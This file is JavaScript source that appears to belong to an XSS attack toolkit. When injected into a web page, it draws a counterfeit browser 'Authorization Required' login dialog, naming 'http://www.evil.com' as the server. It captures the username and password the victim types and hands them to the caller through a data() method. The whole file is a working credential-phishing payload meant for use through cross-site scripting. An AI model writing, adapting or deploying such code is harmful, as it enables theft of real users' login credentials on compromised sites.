xsstd.httpauth = xsstd.std.extend({

   constructor: function(){

	   	this._setParams(arguments[0]);
   },

   showHTTPAuth: function(){
   		console.log('shotauth');
   		this._setParams(arguments[0]);

   		var _self = this;

   		$css = $('<style />');
   		$css.html(this.authCSS);
   		$('head').append($css);

   		$('html,body').css('height','100%');

   		$auth = $('<div />');
   		$auth.attr('id', 'httpauth_cover');

   		var _html = this.authHTML
   			.split('%%server%%')
   			.join (_self._server)
   			.split('%%msg%%')
   			.join(_self._msg);

   		$auth.html(_html);
   		$auth.hide();

   		$('body').prepend($auth);

   		$auth.fadeIn('fast');

   		$('#httpauth_user').focus();

   		$('#httpauth_submit').click(function(){ _self.trigger('click'); });
   		$('#httpauth_cancel').click(function(){ _self.trigger('cancel'); });
   		$('#httpauth_x').click(function(){ _self.close(); });

   		///$('#httpauth_cancel').click(function(){ _self.click(); } );

   		return this;

   },

   close: function(){

   		var _self = this;

   		$('#httpauth_cover').fadeOut('fast', function(){
   			$('#httpauth_cover').remove();
   			if (callback!=undefined){
   				callback();
   			}
   		})

   },

   clear: function(){
   		$('#httpauth_user').val('');
   		$('#httpauth_pass').val('');
   },

   _setParams: function(args){

	   	if (typeof args!='undefined'){
		   	if(typeof args.selector=='string'){
		   		this._msg = args.msg;
		   	}
		   	if(typeof args.bubble=='string'){
		   		this._server = args.server;
		   	}
		}
   },

   data: function() { 
   		return {
   			user:$('#httpauth_user').val(),
   			pass:$('#httpauth_pass').val()
   		};
   },

   _msg: 'Must be authenticated.',
   _server: 'http://www.evil.com',

   authCSS: '#httpauth_cover{width:100%;height:100%;position:fixed;margin:0;padding:0;top:0;left: 0;z-index:999999;background-color: rgba(0,0,0,.5);}#httpauth_box{width:398px;background:#fff;margin:0 auto;-webkit-box-shadow:0 0 4px 4px rgba(0,0,0,0.1);box-shadow:0 0 4px 4px rgba(0,0,0,0.1);-moz-box-shadow:0 0 4px 4px rgba(0,0,0,0.1);margin-top:-10px;border:1px solid #b1b1b1;-moz-border-radius:2px;border-radius:2px}#httpauth_content{padding-top:11px;padding-left:20px;padding-right:20px;font-family:"Arial"}#httpauth_content h1{font-weight:normal;font-size:18px;font-family:Calibri,Candara,Segoe,"Segoe UI",Optima,Arial,sans-serif}#httpauth_content p{font-size:13px;line-height:18px;margin-right:14px}#httpauth_content td{font-family:Arial;font-size:12px}#httpauth_content input{font-family:Arial;font-size:13px;width:270px;margin-left:11px}#httpauth_content table{width:100%}#httpauth_content .btn{font-family:Arial;font-weight:bold;font-size:13px;width:96px;height:28px;border:0;color:#515151;margin:15px 0 13px 7px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGAAAAA4CAIAAACNJ2r1AAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyRpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMC1jMDYxIDY0LjE0MDk0OSwgMjAxMC8xMi8wNy0xMDo1NzowMSAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNS4xIE1hY2ludG9zaCIgeG1wTU06SW5zdGFuY2VJRD0ieG1wLmlpZDoxQ0Q4MjQ5RDkwNUExMUUyQThDQ0M5NURCMjE1NzlDRCIgeG1wTU06RG9jdW1lbnRJRD0ieG1wLmRpZDoxQ0Q4MjQ5RTkwNUExMUUyQThDQ0M5NURCMjE1NzlDRCI+IDx4bXBNTTpEZXJpdmVkRnJvbSBzdFJlZjppbnN0YW5jZUlEPSJ4bXAuaWlkOjFDRDgyNDlCOTA1QTExRTJBOENDQzk1REIyMTU3OUNEIiBzdFJlZjpkb2N1bWVudElEPSJ4bXAuZGlkOjFDRDgyNDlDOTA1QTExRTJBOENDQzk1REIyMTU3OUNEIi8+IDwvcmRmOkRlc2NyaXB0aW9uPiA8L3JkZjpSREY+IDwveDp4bXBtZXRhPiA8P3hwYWNrZXQgZW5kPSJyIj8+p1dJNAAABdVJREFUeNrsG0tP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)}#httpauth_content .btn:hover{background-position-y:-28;color:#222}#httpauth_x{background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAoAAAAKCAIAAAACUFjqAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyRpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMC1jMDYxIDY0LjE0MDk0OSwgMjAxMC8xMi8wNy0xMDo1NzowMSAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNS4xIE1hY2ludG9zaCIgeG1wTU06SW5zdGFuY2VJRD0ieG1wLmlpZDoxQ0Q4MjRBMTkwNUExMUUyQThDQ0M5NURCMjE1NzlDRCIgeG1wTU06RG9jdW1lbnRJRD0ieG1wLmRpZDoxQ0Q4MjRBMjkwNUExMUUyQThDQ0M5NURCMjE1NzlDRCI+IDx4bXBNTTpEZXJpdmVkRnJvbSBzdFJlZjppbnN0YW5jZUlEPSJ4bXAuaWlkOjFDRDgyNDlGOTA1QTExRTJBOENDQzk1REIyMTU3OUNEIiBzdFJlZjpkb2N1bWVudElEPSJ4bXAuZGlkOjFDRDgyNEEwOTA1QTExRTJBOENDQzk1REIyMTU3OUNEIi8+IDwvcmRmOkRlc2NyaXB0aW9uPiA8L3JkZjpSREY+IDwveDp4bXBtZXRhPiA8P3hwYWNrZXQgZW5kPSJyIj8+p/92uAAAAIRJREFUeNp8jrsNBCEMRNfoEoogoDYCIqohIqA2Aoogg323RuiS25GQ5mMzlrXW9R8fXs5ZREII1lrkGKPWylpKyaCNMa21Usp4AEGyQCRMqdV7d85hKYkx8plo95mAn+z78fUK87vqHkD0jh1z5+kDOoG54zmn9177AASJuS9/6b4FGACcm2B8gXJQmQAAAABJRU5ErkJggg==);width:10px;height:10px;position:relative;top:6px;float:right;margin-right:11px;margin-top:11px}',
   authHTML: '<div id="httpauth_box"><img id="httpauth_x" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAoAAAAKCAIAAAACUFjqAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyRpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMC1jMDYxIDY0LjE0MDk0OSwgMjAxMC8xMi8wNy0xMDo1NzowMSAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNS4xIE1hY2ludG9zaCIgeG1wTU06SW5zdGFuY2VJRD0ieG1wLmlpZDoxQ0Q4MjRBMTkwNUExMUUyQThDQ0M5NURCMjE1NzlDRCIgeG1wTU06RG9jdW1lbnRJRD0ieG1wLmRpZDoxQ0Q4MjRBMjkwNUExMUUyQThDQ0M5NURCMjE1NzlDRCI+IDx4bXBNTTpEZXJpdmVkRnJvbSBzdFJlZjppbnN0YW5jZUlEPSJ4bXAuaWlkOjFDRDgyNDlGOTA1QTExRTJBOENDQzk1REIyMTU3OUNEIiBzdFJlZjpkb2N1bWVudElEPSJ4bXAuZGlkOjFDRDgyNEEwOTA1QTExRTJBOENDQzk1REIyMTU3OUNEIi8+IDwvcmRmOkRlc2NyaXB0aW9uPiA8L3JkZjpSREY+IDwveDp4bXBtZXRhPiA8P3hwYWNrZXQgZW5kPSJyIj8+p/92uAAAAIRJREFUeNp8jrsNBCEMRNfoEoogoDYCIqohIqA2Aoogg323RuiS25GQ5mMzlrXW9R8fXs5ZREII1lrkGKPWylpKyaCNMa21Usp4AEGyQCRMqdV7d85hKYkx8plo95mAn+z78fUK87vqHkD0jh1z5+kDOoG54zmn9177AASJuS9/6b4FGACcm2B8gXJQmQAAAABJRU5ErkJggg=="/><div id="httpauth_content"><h1>Authorization Required</h1><p>The server %%server%% requires a username and password. The server says: %%msg%%</p><table><tbody><tr><td>User Name:</td><td align="right"><input type="text" id="httpauth_user" value=""/></td></tr><tr><td>Password:</td><td align="right"><input type="password" id="httpauth_pass" value=""/></td></tr><tr><td></td><td align="right"><input type="submit" id="httpauth_cancel" value="Cancel" class="btn" style="font-weight:normal;"/><input type="submit" id="httpauth_submit" value="Log In" class="btn"/></td></tr></tbody></table></div></div>'
 
});
